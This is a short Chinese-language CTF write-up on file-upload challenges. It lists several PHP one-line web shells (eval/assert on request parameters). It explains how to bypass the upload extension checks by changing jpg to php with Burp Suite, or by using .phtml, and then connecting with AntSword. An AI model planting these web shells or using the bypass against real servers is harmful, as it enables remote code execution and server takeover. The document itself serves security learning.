---
title: Easyupload 1.0 2.0
published: 2025-09-07
category: CTF
---

打开网址发现是一个文件上传的网站。首先想到传一句话木马，但文件格式要是png或jpg，用bp修改前端即可（没有前后端校验）。

## 常用 PHP 一句话木马

```php
<?php @eval($_POST['r00ts']);?>
<?php phpinfo();?>
<?php @eval($_POST['cmd']);?>
<?php @eval($_REQUEST['cmd']);?>
<?php assert($_REQUEST['cmd']); ?>
```

## 1.0 解法

以 `<?php @eval($_POST['r00ts']);?>` 为例，使用bp修改jpg为php，上传成功。

用蚁剑连接发现是假flag，于是改用 `<?php phpinfo();?>` 查看phpinfo，在 `/upload/a.php` 的 `environment` 里成功找到flag。

## 2.0 解法

改php后缀不行，采用 `.phtml`，使用蚁剑连接即可拿到flag。
